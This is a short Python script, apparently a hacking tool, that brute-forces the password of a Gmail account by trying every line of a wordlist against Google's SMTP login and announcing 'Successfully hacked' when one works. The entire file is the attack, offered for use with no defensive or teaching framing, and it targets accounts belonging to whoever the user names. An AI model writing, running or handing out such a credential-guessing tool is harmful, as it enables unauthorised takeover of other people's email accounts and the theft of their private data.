import smtplib

def interact():
    gmail = raw_input("Enter Google Email id to hack: ")
    pass_list = raw_input("Enter the wordlist path to brute force: ")

    print("[+] Locating Google SMTP servers for secure login")
    google_server = smtplib.SMTP("smtp.gmail.com", 587)
    print("[+] Attempting connection to Google servers: ")

    try:
        google_server.ehlo()
        google_server.starttls()
        print("[+] Successfully connected to Gmail SMTP server")
    except smtplib.SMTPConnectError:
        print("[-] Unable to connect to google servers on Port 587 ")
        quit()

    try:
        pass_list = open(pass_list, 'r')
    except IOError:
        print("[-] File not found\n\n[+] Exiting ...")
        quit()

    print("[+] Brute force started on " + gmail + "\n")

    for pwd in pass_list:
        try:
            google_server.login(gmail, pwd)
            print("\n\n\t[+]Successfully hacked , password is " + pwd + "\n\n")
            quit()
        except smtplib.SMTPAuthenticationError:
            print("[-] Trying password :\t" + pwd)

    print("[-] Failed to hack Gmail : " + gmail)
    quit()